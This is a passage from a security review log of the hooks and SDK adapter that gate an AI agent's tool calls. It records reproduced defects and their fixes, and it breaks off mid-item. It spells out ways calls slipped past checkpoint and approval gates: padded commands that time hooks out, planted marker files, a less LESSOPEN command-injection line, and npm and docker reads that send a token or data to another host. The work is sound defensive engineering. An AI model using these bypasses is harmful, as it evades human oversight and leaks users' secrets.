# Security loop on the safety layers

Rounds of security review of the layers that must fail closed (STANDARD
1.2.0 §5.18, spec/SECURITY.md): the plugin's hooks and skills, the Python
SDK adapter, the TypeScript package and the Standard Agents binding. Each
defect below was reproduced by an independent verifier before it was fixed.
The whole-change review rounds before this loop are recorded in PHASE4.md;
each round here checked that their fixes hold.

## Round 1

Six defects, all in the plugin's hooks, with SDK siblings for 4 and 2. Each
fix has tests that fail on the code before it (checked by running the new
tests with the old hooks, adapter and tracker stashed: 48 of them failed,
plus the shipped-state-file test of the tracker; the rest are controls).

### 1. Quadratic trim before the 4096-byte bound (medium)

Round 2 bounded `split_words` at 4096 bytes (PHASE4.md, hooks-skills 8), but
`classify_bash` trimmed the command first, and the trim of trailing blanks,
`${command##*[![:space:]]}`, costs the line times its run of blanks: 50,000
trailing blanks took 44 s (60 s on the reporter's machine), 100,000 leading
ones 10 s. A hook that gives no verdict lets Claude Code run the call. The
fix holds round 2's bound and closes its sibling.

- Fix: `classify_bash` checks `${#command}` against 4096 before any trim
  (over it: `mutate`); `posttooluse_take_checkpoint.sh` does the same before
  its trims (over it: no marker). After: 50,000 trailing spaces 23 ms,
  200,000 leading spaces 31 ms, 200,000 trailing tabs 37 ms; the worst case
  under the bound (4,084 trailing blanks) 254 ms.
- `hooks/hooks.json`: the PreToolUse hook has `"onFailure": "block"` and
  `"timeout": 30`. Claude Code 2.1.325+ blocks the call when a command hook
  with that setting fails, cannot start or times out (read from its binary:
  `Iq`, and the "gave no verdict in time" path); its default timeout is
  600 s. SECURITY.md §5.5 no longer says there is no fail-closed hook mode:
  it says a Claude Code without the setting ignores it.
- Tests: `TestShellHookTimeBound` in `tests/test_pretooluse_hooks.py`
  (50,000 trailing spaces and tabs, 200,000 leading spaces, and `ls` with
  50,000 trailing spaces, each F501 within 10 s; the hook entry's
  `onFailure` and `timeout`);
  `test_long_blank_runs_are_not_trimmed_and_write_no_marker` (three) in
  `tests/test_hook_checkpoint_lifecycle.py`. The padded ones ran past the
  30 s subprocess timeout before.
- Sibling checked: the SDK mapper's classifier is linear (`str.strip`;
  200,000 blanks in 0.06 s). No skill hook uses these expansions.

### 2. Rollback check trusted records in the work tree (medium)

`recorded_commit` accepted `.claude/checkpoints/commits/<sha>`, or a marker
naming `<sha>`, under the project directory, and a rollback exits 0 before
the marker and mode checks: a cloned repository that tracks an entry for a
hidden merge commit made `git stash apply <merge>` run with no checkpoint
and no approval in any mode. Sibling: a tracked `.claude/checkpoint.ok` with
fresh times authorised a gated call.

- Root cause: the layer's records were files repository content can supply.
  Fix: `posttooluse_take_checkpoint.sh` enters each commit in the project's
  git directory, `<git dir>/acs/checkpoints/commits/<sha>` (`git rev-parse
  --absolute-git-dir`), which no clone, checkout or applied stash writes
  (an applied stash can restore untracked files into the work tree); the
  pre-tool-use hook and the rollback skill's command hook look there only.
  The marker's `commit` no longer authorises a restore (the take hook
  always enters the commit first), and a restore must run in the project's
  repository: the payload's `cwd` must have the project's git directory (a
  restore into another repository or worktree restores other state).
  Without a git directory, a commit is not entered and no marker names it.
- A marker git tracks authorises nothing: `git -C .claude ls-files
  --error-unmatch -- checkpoint.ok` (asked from the marker's directory, so a
  `.claude` that is a symbolic link or a submodule is read where it leads);
  F501, and the file is left in place.
- A gated call that names the records (a Write, Edit, MultiEdit or
  NotebookEdit path, or a Bash command, holding `checkpoint.ok`,
  `.claude/checkpoints` or `acs/checkpoints`) is refused with F504 before it
  can use a checkpoint. Reading them is not refused; a path a command builds
  at run time is not seen (it stays a gated `mutate`), as SECURITY.md §5.5
  says.
- SDK sibling: `CheckpointTracker` loaded `tracker_state.json` from its
  `checkpoint_dir` (`.checkpoints` in the project by default) whoever wrote
  it, so a cloned state file's active checkpoint authorised a call within
  30 minutes of its `created_at` (rollback was safe: `has_commit` counts only
  checkpoints taken since the adapter started). Fix: a state file git
  tracks is not loaded (`_tracked_by_git`, the same question asked from the
  file's directory; a git that does not answer in 10 s counts as tracked);
  the tracker starts fresh and logs why.
- Tests: `TestShellHookTrustsOnlyItsOwnRecords` (a clone with a tracked
  entry and marker: `git stash apply <merge>` is F501 in bypassPermissions
  and default modes; the tracked marker is refused with "tracked by git"
  and kept; the same through a `.claude` symlink to a tracked directory; an
  untracked marker still authorises one call; a restore with `cwd` in
  another repository is F501, in the project or a subdirectory of it
  allowed; six calls that write the records are F504; reading them and an
  Edit of a document that mentions them pass), `test_rollback_restores_only_a_recorded_checkpoint`
  (now in a repository); `TestRollbackCommandHook::test_a_cloned_entry_or_marker_restores_nothing`
  and `test_a_restore_in_another_repository_restores_nothing` (sh and bash);
  `test_a_commit_outside_a_repository_writes_no_marker`;
  `tests/test_checkpoint_persistence.py::TestShippedStateFile` (a cloned
  state file authorises nothing; the same file untracked still loads). The
  fixtures that planted an entry by hand plant it where the take hook
  writes it, and the lifecycle tests that take a checkpoint run in a
  repository.
- The rollback skill's hook reads the call's `cwd` and command with one `jq`
  call (it read stdin with `cat`, which a test's `PATH` without `jq` lacks).

### 3. Only five tools were routed to the pre-tool-use hook (medium)

`hooks.json` matched `Write|Edit|MultiEdit|NotebookEdit|Bash`, and the hook
answered `exit 0` for any other tool: `Monitor` (a built-in tool that runs a
shell command), `PowerShell`, `ExitWorktree` (removes a worktree and its
uncommitted work) and every MCP tool ran with no checkpoint, and with no
approval where Claude Code asks no one. §5.18.2 requires an unbound tool's
call to be treated as a mutation; SECURITY.md called this a host gap,
though Claude Code routes every tool to a `*` matcher.

- Fix: matcher `*`. The hook lets pass only `UNGATED_TOOLS`, the SDK
  mapper's static tools whose capability needs neither a checkpoint nor
  approval (Read, Glob, Grep, LS, WebFetch, WebSearch, Task, Agent, Skill,
  AskUser, AskUserQuestion, TodoRead, TodoWrite, TaskList, TaskGet,
  TaskCreate, TaskUpdate, ToolSearch, BashOutput, TaskOutput,
  ListMcpResourcesTool, ReadMcpResourceTool, ExitPlanMode); Write, Edit,
  MultiEdit and NotebookEdit stay `mutate`, Bash is classified by its
  command, and every other tool is an unbound `mutate`, whose approval
  request says `(unbound: treated as a mutation, STANDARD 1.2.0 §5.18.2)`.
  This agrees with the mapper, which maps Monitor, PowerShell and unknown
  tools to `UNCLASSIFIED_TOOL`; `Monitor`'s command is not read as Bash's,
  since the mapper does not read it either.
- Tests: `TestShellHookRoutesEveryTool` (matcher `*`; six unbound tools are
  F501 without a marker, F502 in bypassPermissions with one, and asked with
  the unbound reason in default mode; seven ungated tools pass);
  `tests/test_hook_lists_match_mapper.py`: `UNGATED_TOOLS` are mapper tools
  needing neither, every tool the mapper gates is off the list, and
  Monitor, PowerShell and an MCP tool are gated in both. The matcher tests
  in `tests/test_hooks_unit.py` accept `*`, which routes every tool.

### 4. Turn boundaries the hooks never saw; scope never stated (medium)

Only `Stop` ended the marker. Claude Code runs `StopFailure` in place of
`Stop` when an API error ends the turn, an interrupt or a killed session
may run neither, so a marker stayed valid into the next turn or session for
up to 30 minutes (the verifier reproduced it: an edit between turns, then a
Write in the next turn used the old marker). The cross-session use the
report led with is not a violation once the scope is stated: the hooks'
records are per project directory.

- Fix: `stop_end_checkpoints.sh` is also registered on `StopFailure`,
  `UserPromptSubmit` (the next turn starts: this covers interrupts and
  crashes within a session), `SessionStart` and `SessionEnd`. It prints
  nothing and exits 0 (a UserPromptSubmit hook that exits 2 would refuse
  the prompt). SECURITY.md §5.5 states the scope (the project directory,
  every session and subagent in it, one marker, its history and the commit
  entries), the boundaries and the maximum age; hooks/README says the same.
- SDK sibling: the adapter's boundaries were Stop alone (SubagentStop
  resolves holds and is not a boundary). Fix: `wrap_options()` adds a
  `UserPromptSubmit` hook, the same boundary (`_make_boundary("turn
  started")`): what a turn left when its Stop never came ends at the next
  prompt. The adapter's conformance statement, its docstrings and the SDK
  guide name both boundaries.
- Tests: `test_every_boundary_event_ends_the_marker` (hooks.json) and
  `test_a_marker_left_by_an_earlier_turn_authorises_nothing` (each of the
  five events) in the lifecycle tests;
  `TestTurnEndReleasesLeftoverReservation::test_the_next_prompt_ends_what_a_turn_without_stop_left`
  (a hold and a second valid checkpoint, then UserPromptSubmit: the hold is
  used, nothing validates, a boundary record is written).

### 5. The log hook dropped input jq could not parse (medium)

`posttooluse_log_tool.sh` read the tool name with `jq ... || tool_name=""`
and exited 0 silently when it was empty, so a call whose input or result
nested past jq's depth limit (253 here), or held a lone high-surrogate
escape (what JSON.stringify writes for a string cut inside an emoji), was
not logged and not reported, against §6.4's "never silently".

- Fix: a jq failure on the input is reported (`fail`: exit 1, the reason
  with jq's first error line, which names a position and no content); only
  valid JSON that is not an object with a string `tool_name`, or no input,
  exits 0 as no tool call. Input that is not JSON at all, or a JSON value
  followed by text, is now reported the same way (two existing tests that
  expected exit 0 for it now expect the report). The pre-tool-use hook
  already blocked such input with R407, and the take hook writes no marker
  for it.
- Tests (`tests/test_hooks_unit.py`):
  `test_a_call_nested_past_jqs_limit_is_reported` (depths 253, 300 and
  10,000, in `tool_input` and in `tool_response`),
  `test_a_call_with_a_lone_surrogate_is_reported`,
  `test_input_jq_cannot_parse_is_reported` (two), and
  `test_input_without_a_tool_name_is_not_logged` (valid JSON and empty
  input still exit 0 with nothing on stderr).

### 6. The pre-tool-use hook ignored ACS_CHECKPOINT_MAX_AGE (low)

The take and log hooks read `ACS_CHECKPOINT_MAX_AGE` (the log records it on
every line as the setting the call was held to), but the pre-tool-use hook
checked only the marker's `expires_at` and the fixed 1800 s cap, so a
marker written under a longer setting, or by another writer (the SDK's
`CheckpointTracker(marker_dir=...)`), was honoured past the stated age.

- Fix: the hook reads the setting as the other two do (1 to 1800, else
  1800) and treats a marker past `created_at + max_age` as expired (F501,
  filed under `ended/`).
- Test: `test_the_layer_maximum_age_applies_to_a_marker_written_under_a_longer_one`
  (a marker 600 s old with 1200 s left is F501 under a 60 s maximum and
  filed under `ended/`; a fresh one passes under the same setting).

### Documentation

SECURITY.md §5 (the figure's text, §5.1, §5.2, the §5.4 rows for the plugin
hooks and the rollback skill, §5.5's scope and host gaps), hooks/README
(table, flow, configuration with the new `hooks.json`, classification,
records, boundaries, log hook; the audit-line example recomputed for the new
`config_sha256`), CLAUDE.md's hook list, README's hook table, the SDK guide
(boundaries), the EU AI Act risk page (the hook asks for approval and gates
unknown tools), the findings file's rollback resolution, and CHANGELOG
Upgrading (a new "fail-closed fixes" item for the plugin hooks; the SDK's
UserPromptSubmit hook and state-file rule). No version changes.

### Checks after round 1

- Python: `pytest tests/` (4769 passed, 18 skipped); the hook, skill,
  persistence and integration files rerun after formatting (724 passed);
  ruff check and format with CI's lists; mypy; every `tools/validate_*.py`
  of CLAUDE.md, `validate_workflows.py --strict` and every domain catalog
  and example `--strict`; the generators' `--check` (`sync_skill_schemas`
  107, `gen_runtime_fixtures` 368, `gen_call_fixtures` 35 and 30,
  `gen_trigger_vectors`, `gen_standard_agents_binding`,
  `gen_capability_json_schemas`).
- The reporters' probes rerun on this tree: `rm -rf a.txt` with 50,000
  trailing spaces, 200,000 leading spaces or 200,000 trailing tabs is F501
  in 23 to 37 ms (60 s and more before); the clone, Monitor, boundary,
  deep-input and maximum-age probes are the tests above.
- Rust: no Rust source changed (the WebAssembly build for the package was a
  no-op rebuild), so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build:wasm, build, check, test (1877);
  the binding's check and test (191, 2 skipped). No call fixture changed;
  the adapter's conformance statement gains its UserPromptSubmit boundary.
- Site: `npm run check` and `npm test` (1173). `scripts/check-runs.mjs` was
  not run (no Chromium here); the one enforced page touched,
  /guides/claude-agent-sdk/, gains five words in the Checkpoint Lifecycle
  section's Validity item and one word in a list of hooks.

### Batch 1 recheck: the four reported defects and their siblings

Security round 1's first batch (defects 1 to 4 above, as an independent
verifier reproduced them on 99c37dd) was rechecked on this tree, b61b3b1,
before anything else was changed. Each fix holds:

- 1: the reporters' probe, `rm -rf a.txt` padded with 50,000 trailing
  spaces, 200,000 leading spaces, 200,000 trailing tabs or 1,000,000
  trailing spaces, is F501 in 22, 32, 40 and 107 ms (each under `timeout
  120` and a 4 GB address-space limit); `hooks.json` gives the hook
  `onFailure: "block"` and `timeout: 30`, which Claude Code 2.1.325's binary
  honours for a command hook (`Iq`).
- 2: the clone tests (`TestShellHookTrustsOnlyItsOwnRecords`,
  `TestRollbackCommandHook`, `TestShippedStateFile`) pass; the SDK holds too:
  a checkpoint a first adapter took on a `checkpoint_dir` does not authorise
  a gated Write in a second adapter on the same directory ("no checkpoint
  was taken in this scope"), and the tracker drops a loaded checkpoint dated
  after its load, so a planted state file never authorises a call.
- 3: `Monitor`, `PowerShell`, `ExitWorktree` and an MCP tool are gated
  (`TestShellHookRoutesEveryTool`, `test_hook_lists_match_mapper.py`).
- 4: each boundary event ends the marker (the lifecycle tests); the SDK's
  UserPromptSubmit boundary test passes; the Standard Agents binding's
  boundary is a new execution (`flowId`), so it has no turn to miss.

The targeted files (hooks, lifecycle, mapper lists, skill hooks,
persistence: 697 tests) passed before any change. Four siblings were found
and fixed; each new test was run against the code before the fix and fails
there.

#### 7. The audit skill's hook read its append form in quadratic time (medium)

Sibling of 1: a PreToolUse command hook whose run outlives its time limit
gives no verdict, and the call runs. The audit skill's `Bash` hook read
`printf '%s\n' '<record>' >> ...records.jsonl` with `${REST%%\'*}` and
`${REST#*\'}`; with no quote after the record, the second costs the line
times itself (dash, which runs `sh -c` here: 25 KB 0.94 s, 50 KB 3.7 s,
100 KB 15.1 s, so about 700 KB outlives Claude Code's default 600 s; bash's
`%%` is quadratic too, 5.1 s at 1 MB). The check is the §6.7 credential scan
of an audit record (§5.18.10).

- Fix: the form is read with one `case` pattern per allowed destination
  (`"$FORM"*"$TO"`) and the removal of the literal prefix and suffix; a
  record holding a quote or a line break is not the form (as before). In
  both shells 1 MB takes at most 25 ms.
- Tests: `TestAuditCommandHook::test_a_long_line_is_decided_in_bounded_time`
  (sh and bash: 200 KB and 1 MB records with no closing quote, a 1 MB
  record that is not JSON, and a valid 1 MB record, each decided within
  10 s). All 8 failed on the old hook (each hit the 30 s subprocess
  timeout).
- Siblings checked: the persist, rollback and send hooks, and the shared
  secret scan, took at most 75 ms on 400 KB adversarial inputs (repeated
  `password=`, `a://b:`, `authorization: `, blanks before a restore id,
  newline-separated restores, `http://a`, numeric hosts, a long option
  cluster); the log hook took at most 367 ms on a 1 MB command and output
  (blanks, quotes, `a/` segments); the take hook stops at 4096 bytes before
  any trim.

#### 8. The skill command hooks did not block when they failed (medium)

Sibling of 1's `onFailure` fix: `hooks.json` gave the plugin's PreToolUse
hook `onFailure: "block"`, but the four blocking skill command hooks
(audit, persist, rollback, send), which make code-decided checks (§6.7
secrets, the §5.18.10 destination row, F503 rollback history), set neither
it nor a `timeout`: one that crashed or timed out let the call run. Claude
Code parses a skill's frontmatter `hooks` with the settings' hook schema
(`sQ`), whose command hook takes `timeout` and `onFailure`.

- Fix: each sets `timeout: 30` and `onFailure: block`.
- Test: `test_a_command_hook_that_fails_or_times_out_blocks_the_call` (four);
  all four failed before.

#### 9. The SDK adapter's safety hook did not block when it failed in the CLI (medium)

SDK sibling of 1's `onFailure` fix. The adapter's PreToolUse callback
refuses with R407 when a check fails inside it, but a callback that fails
or gives no verdict within the matcher's timeout (60 s by default), as the
CLI sees it, was no decision there: the call ran (in `bypassPermissions`
outright). `claude-agent-sdk` 0.2.172 carries `HookMatcher.on_failure`, and
with `"block"` it refuses to connect to a Claude Code that does not honour
it (`hook_on_failure_supported`, which Claude Code 2.1.325 answers).

- Fix: `wrap_options()` registers the safety hook's matcher with
  `on_failure="block"` (`_wrap_hook(..., on_failure=...)`; the dict form
  without the SDK carries it too). An SDK whose `HookMatcher` lacks the
  field cannot ask for it: the adapter logs a warning, and the conformance
  statement lists that host gap. The other hooks keep the SDK's default (the
  boundary and PostToolUse callbacks catch their own errors; a PostToolUse
  block cannot undo a call).
- Tests (`TestPreToolUseInWrapOptions`):
  `test_the_safety_hook_blocks_when_it_fails_in_the_cli` (the safety
  matcher blocks, a caller's matcher and every other hook are unchanged)
  and `test_without_the_sdk_the_dict_form_carries_it`; both failed before.
  No call fixture changed; the statement gains a host gap.

#### 10. The records guard read one spelling of each path (low)

Sibling of 2's F504 guard, which tests the call's text for `checkpoint.ok`,
`.claude/checkpoints` and `acs/checkpoints`: `.git/acs//checkpoints/...`,
`.git/acs/./checkpoints/...`, `.git/acs/x/../checkpoints/...`,
`.git/ACS/Checkpoints/...` (the same directory on a case-insensitive file
system) and `.claude/Checkpoint.OK` were not refused, so an entry, a
permanent pass for a restore, could be written by a call a person approves
as an ordinary write. Such a call still needed a checkpoint and approval.

- Fix: the text is read as a path is: case-insensitive, a run of slashes
  and `./` segments as one slash (a regular expression, linear in the
  text), and, in a text of at most 4096 bytes, each `x/../` resolved
  (jq's `split` and `reduce`, whose cost grows faster than the text: 1 MB
  of `a/` took 11 s, so a longer text is not resolved; a longer path cannot
  be opened, and a longer command is a `mutate` already). `Monitor` and
  `PowerShell` commands are read as Bash's. A megabyte command takes
  129 ms. (jq 1.7's regex `splits` is quadratic in the number of matches:
  not used.)
- Tests: `test_another_spelling_of_the_records_is_refused` (13: five
  spellings of an entry, the marker in other case, `.claude//checkpoints`,
  three Bash spellings, Monitor, PowerShell, and a padded command over
  4096 bytes); all 13 failed before. `test_a_long_path_is_read_in_bounded_time`
  (a 1 MB command of segments, decided within 10 s) is a control.
- The SDK adapter keeps no records in the work tree that authorise a call
  (see 2 above), so it has no such guard to align.

#### Documentation

SECURITY.md (§5.1's records sentence, the §5.4 plugin row for the records,
the consequence on the skills' command hooks, §5.5's host gap on
`onFailure` and its adapter paragraph), hooks/README (records, skill
hooks), CLAUDE.md's hook list, the SDK guide (a troubleshooting entry for
the connection error), the adapter's docstrings and conformance statement,
and CHANGELOG Upgrading (the plugin hooks' fail-closed item, the SDK item).
No version changes.

#### Checks after the batch 1 recheck

- Python: `pytest tests/` (4797 passed, 18 skipped; 28 more than after
  round 1, the new tests); ruff check and format; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; the generators' `--check`
  (`sync_skill_schemas`, `gen_runtime_fixtures`, `gen_call_fixtures`,
  `gen_trigger_vectors`, `gen_standard_agents_binding`,
  `gen_capability_json_schemas`).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1877; the
  WebAssembly build reused); the binding's check and test (191, 2 skipped).
  No call fixture changed.
- Site: `npm run check` and `npm test` (1173). `scripts/check-runs.mjs` was
  not run (no Chromium here); the enforced page touched,
  /guides/claude-agent-sdk/, gains one entry with a fence in its
  Troubleshooting run, an exempt run of that form.

### Batch 2: five reported defects

Security round 1's second batch: five defects an independent verifier
reproduced on 99c37dd. Two were already fixed on this tree by the round's
first commit (b61b3b1); the other three, and two siblings found while
fixing them, are fixed here. Each fix has tests that fail on the code
before it (run with the old mapper, adapter and hook restored: 53 of the
new tests failed, 4 of them controls that fail there only because
`map_tool` took no `cwd`; the rest are controls that pass on both).

#### Already fixed: the log hook's jq depth limit, the hook's maximum age

- "Audit log hook drops a call silently when its JSON nests past jq's parse
  depth" is item 5 above. The reporter's probe on this tree: depths 254,
  300 and 10,000 in `tool_input`, and 300 in `tool_response`, each exit 1
  with "the hook input could not be parsed (jq: parse error: Exceeds depth
  limit ...) ... this tool call was not logged"; the tests of item 5 pass.
- "Pre-tool-use hook ignores the configured ACS_CHECKPOINT_MAX_AGE" is item
  6. The reporter's probe (a marker 600 s old with 1200 s left, the setting
  60): F501 "checkpoint has expired", the marker filed under `ended/`;
  `test_the_layer_maximum_age_applies_to_a_marker_written_under_a_longer_one`
  passes.

#### 11. less and more were read-only in the SDK mapper (high)

`_READ_ONLY_COMMANDS` held `less` and `more`, and `_writes` refused only
the less options it knew wrote (`+cmd`, `-o`, `-O`, `--log-file`). less
reads a lesskey source (`-k FILE`, `--lesskey-file`, `--lesskey-src`,
`--lesskey-content`, or any abbreviation, `--lesskey-s=`), whose `#env`
section sets `LESSOPEN`, which less runs when it opens a file, a pipe
included: `printf '#env\nLESSOPEN=|cmd; cat %%s\n' | less
--lesskey-src=/dev/stdin f` ran `cmd` with no checkpoint, no approval and no
destination check (the verifier ran a payload that wrote an environment
secret to a file and one that would send it with wget; the adapter allowed
both under `allowed_destinations`). The plugin hook never listed them.

- Root cause: an allow-listed command whose options were refused by a
  deny-list, against §5.18.3's worst case for any argument the classifier
  does not recognise; and a pager's behaviour also depends on files the
  classifier cannot read (`LESSOPEN` in the environment, a lesskey file in
  the home directory; macOS's `more` is less). Fix (`mapper.py`): `less`
  and `more` are off the list (and off `_ARGUMENT_WRITERS`, and `_writes`
  loses their rules): each is Bash's worst case, `mutate` and `send`. An
  agent has no terminal to page on; `cat` and `head` read the same.
- Tests (`tests/test_bash_classification.py`): `test_a_pager_is_not_read_only`
  (11: the pipe, a file, a compiled file, abbreviations, `less f`, `more
  f`, `cat f | more`; all failed before) and three more cases in
  `test_a_destination_policy_refuses_them` (the pipe, through the adapter
  with `allowed_destinations`: F504).

#### 12. git reads in a partial clone reach the promisor remote (medium)

In a partial clone, git fetches each object it lacks from the promisor
remote when a command reads it. `git show`, `git log -p` and `git diff`
were `observe` in both the mapper and the hook, so they reached that host
with no checkpoint, no approval and no destination check, and `git show
<any full id>` sent the 20 bytes the agent chose (the verifier's
GIT_TRACE_PACKET showed the `want` line). Reproduced here with a `file://`
partial clone: `git show HEAD~1:big.txt` and `git log -p` fetched (the
missing objects went from 2 to 1 to 0); `git stash create` and `git stash
apply <that commit>` fetched nothing.

- Fix, in both layers alike: a git command the allow-list reads as
  `observe` (one on the read-only list, `git stash list`, `git stash
  show`) gets the worst case where git may fetch: `git -C <dir> config
  --get-regexp '^(remote\..+\.promisor|extensions\.partialclone)$'` finds a
  key, or exits with anything but 1 (no git, no such directory, a
  configuration git cannot read). `<dir>` is the call's directory: the hook
  reads the payload's `cwd` (else the project directory); the mapper's
  `map_tool(tool, args, cwd=None)` takes it (None: the process's working
  directory) and asks `mapper.git_may_fetch(cwd)` (a function that raises
  counts as yes). `git stash create` and the restore of a recorded
  checkpoint keep their classes: they read only what the local state holds
  (the probe above), and gating `git stash create` would leave the plugin no
  way to take a checkpoint in a partial clone.
- The adapter passes the hook input's `cwd` from PreToolUse, PostToolUse and
  PostToolUseFailure. The permission callback's context carries none, so
  the PreToolUse hook keeps each call's `cwd` by call id
  (`_call_dirs`, dropped when the call reports back or at a boundary) and
  the callback classifies the call there: without it, the callback would
  read a call the hook put to a person as an observation and allow it.
- Cost: one `git config` for a git command that would observe (the hook's
  run went from 14 ms to 22 ms; the mapper's from under 1 ms to 3 to 10
  ms).
- Tests: a `partial_clone` fixture in `tests/conftest.py` (two commits
  served over `file://`, cloned with `--filter=blob:none`);
  `TestPartialClone` in `tests/test_bash_classification.py` (the fixture
  fetches what a read lacks; nine git reads, in the clone and a
  subdirectory, are the worst case; a full clone observes; `git stash
  create` and a recorded restore keep their classes; a missing directory,
  a lookup that raises and no git are the worst case; a destination policy
  refuses `git show <id>` with F504 through the adapter; the permission
  callback refuses with F502 what the hook put to a person), and in
  `tests/test_hook_lists_match_mapper.py` the same in both layers (seven
  reads gated in both, the project directory when the payload has no
  `cwd`, a missing directory, a full clone and `ls` observe, `git stash
  create` still a checkpoint).

#### 13. A quoted run of blanks made the SDK classifier quadratic (low)

`_DESTRUCTIVE_PATTERNS`' alternative `\s+(>|>>)\s`, matched against a
command's joined words, was retried from every blank of a run and
backtracked over the run: `ls "` + 40,000 blanks + `"` took 7 to 8 s, and
each call is classified by several hooks. The verifier showed that an
overrun is refused by the CLI (§5.18.8), so this was a bound, not a
fail-open path.

- Fix (`mapper.py`): a command over 4096 UTF-8 bytes (the plugin hook's
  bound, counted alike) is the worst case before any pattern runs; and the
  alternative is gone: `_simple_commands` reads the line's redirections and
  gives an output redirection to anything but `/dev/null` the worst case
  first, so it only matched a quoted `>` in an argument (`grep " > " f`,
  `mutate` before, `observe` now). At the bound the slowest form measured
  (repeated `awk ` words) takes 34 ms, a quoted run of blanks 3 ms.
- Tests: `test_a_command_over_4096_bytes_is_the_worst_case_at_once` (four,
  within 1 s; all failed before), `test_a_command_of_4096_bytes_is_still_read`
  (blanks and two-byte characters at exactly 4096 bytes are read; 4098
  bytes in 2052 characters are not; failed before), and `grep " > "
  notes.txt` in `test_read_only_arguments_stay_read_only`.

#### 14. npm list sent a project's registry token to the registry it names (high; sibling of 12)

Found while fixing 12: another read-only entry that reaches a host its
configuration names. `npm list` was read-only with listed options, but
npm's update check runs with plain `npm list` and asks the registry the
configuration names, a project's `.npmrc` included (repository content),
with the token that file gives for it, `${ENV}` expanded. Reproduced with
npm 11.20.0 and a local listener: a project `.npmrc` of
`registry=http://127.0.0.1:18765/` and
`//127.0.0.1:18765/:_authToken=${FAKE_SECRET}` made `npm list` send `GET
/npm` with `Authorization: Bearer s3cr3t-token`. It was `observe`: no
approval, no destination check.

- Fix: `npm list` is off the list (with its `_SUBCOMMAND_OPTIONS` entry),
  as `npm view` already was: the worst case. The plugin hook never listed
  it.
- Tests: `npm list`, `npm list --depth=0 --json` and `npm list -g --all`
  moved from `test_local_forms_of_those_commands_stay_read_only` to
  `test_a_command_that_reaches_another_host_gets_the_worst_case`, and `npm
  list` joins `test_a_destination_policy_refuses_them`; all failed before.
  `pip list` and `pip show` stay as round 2 left them: pip reads no
  project-level configuration. (Wrong, as security round 5, batch 2 #2
  showed: pip reads the site configuration `sys.prefix/pip.conf`, which an
  in-project virtual environment keeps from the repository, and runs the
  program its `python =` names; both are now off the list.)

#### 15. docker ps, images and logs reach the daemon DOCKER_HOST names (medium; sibling of 12)

The same class, as `kubectl get` was in round 2: the daemon is the one
`DOCKER_HOST` or the docker context names, over tcp or ssh (which runs ssh
with its configuration). Reproduced: with `DOCKER_HOST=tcp://127.0.0.1:18766`
a listener logged `/v1.56/containers/secret-data-leaked/json` for `docker
logs secret-data-leaked`, a name the agent chose.

- Fix: `docker ps`, `docker images` and `docker logs` are off the list:
  the worst case. The plugin hook never listed them.
- Tests: three cases in
  `test_a_command_that_reaches_another_host_gets_the_worst_case` and `docker
  logs` in `test_a_destination_policy_refuses_them`; all failed before.

#### Siblings checked

- The rest of the mapper's read-only list (`ls`, `cat`, `head`, `tail`,
  `file`, `stat`, `du`, `df`, `pwd`, `whoami`, `hostname`, `uname`, `date`,
  `cal`, `printenv`, `echo`, `printf`, `which`, `whereis`, `locate`, `find`,
  `grep`, `cut`, `sort`, `uniq`, `wc`, `diff`, `cmp`, `comm`, `tr`, `git
  ...`, `pip list|show`) was read for options or configuration that run a
  program or reach a host: none besides those above (`sort
  --compress-program`, `find -exec`, `git --output` were already refused).
  git configuration that runs a program on a read (`core.fsmonitor`,
  `diff.external`, a textconv driver) is written only by a gated call or
  the environment, not by repository content.
- The hook's read-only list is a subset of the mapper's (unchanged, and
  still checked by `test_read_only_list_is_a_subset_of_the_mappers`); it
  held none of the removed commands.
- No other classifier pattern is slower than linear in practice at 4096
  bytes (measured: repeated `curl `, `awk `, `xargs `, `python `, `sed `,
  `{a`, quoted words, `&& ls`, `-- `: 3 to 34 ms).

#### Documentation

SECURITY.md (§5.1: the partial-clone rule of the pre-tool-use hook; §5.5:
the adapter's classifier), hooks/README (classification), the SDK guide
(Bash classification: the pagers in the allow-list sentence, the table's
rows, and a partial-clone paragraph after the table), and CHANGELOG
Upgrading (the SDK's Bash fail-closed item, the plugin hooks' partial-clone
item; the earlier Bash items no longer name `less`, `more` or `npm list` as
read-only). No version changes.

The SDK guide is an enforced page of the figure-gap sweep. With the
partial-clone paragraph before the table, its run before the table grew
from 1772 px to 1986 px (measured with `scripts/check-runs.mjs` and the
local Chrome for Testing 153, not CI's headless shell): over the 1800 px
limit. The paragraph now follows the table (a figure), in a run of
1030 px, and the text before the table is no longer than before; the
page's longest enforced run is 1772 px, as at HEAD.

#### Checks after batch 2

- Python: `pytest tests/` (4848 passed, 18 skipped; 51 more than after
  batch 1); ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; the generators' `--check`
  (`sync_skill_schemas`, `gen_runtime_fixtures`, `gen_call_fixtures`,
  `gen_trigger_vectors`, `gen_standard_agents_binding`,
  `gen_capability_json_schemas`).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1877; the
  WebAssembly build reused); the binding's check and test (191, 2
  skipped). No call fixture changed (the call fixtures hold no Bash
  call).
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist
  passed) and `scripts/check-runs.mjs --paths /guides/claude-agent-sdk/`
  with the local Chrome (above).
- Probes cleaned up: the listeners stopped, the scratch repositories and
  the npm home removed.

### Batch 3: five reported defects

Security round 1's third batch: five defects an independent verifier
reproduced on 99c37dd, all in the Python SDK adapter and its tracker and
mapper; none was fixed by an earlier batch (the round's commits b61b3b1,
ffe4ac4 and 2fa8648 touched the hooks and the Bash classifier). Each fix
has tests that fail on the code before it (run with the old tracker,
mapper, bindings loader and adapter restored: 28 of the new or changed
Python tests failed, and the TypeScript package's new cycle test; the rest
are controls that pass on both).

#### 16. A checkpoint of another scope authorised calls; one checkpoint covered two calls (medium)

`CheckpointTracker.__init__` loaded every unused checkpoint in
`checkpoint_dir/tracker_state.json` as its own, and `validate_and_reserve`
held one for any call. The default `checkpoint_dir` (`.checkpoints`) is
shared by every adapter in a working directory, and the statement's scope
is "this adapter instance". Adapter B, built after adapter A took a
checkpoint, ran an unbound MCP call and a Write on A's checkpoint, and A
then ran its own Write on it: one checkpoint, two gated calls in two
scopes. After a restart, an adapter that took one checkpoint ran two
Writes, the second on the earlier process's. Each tracker also wrote the
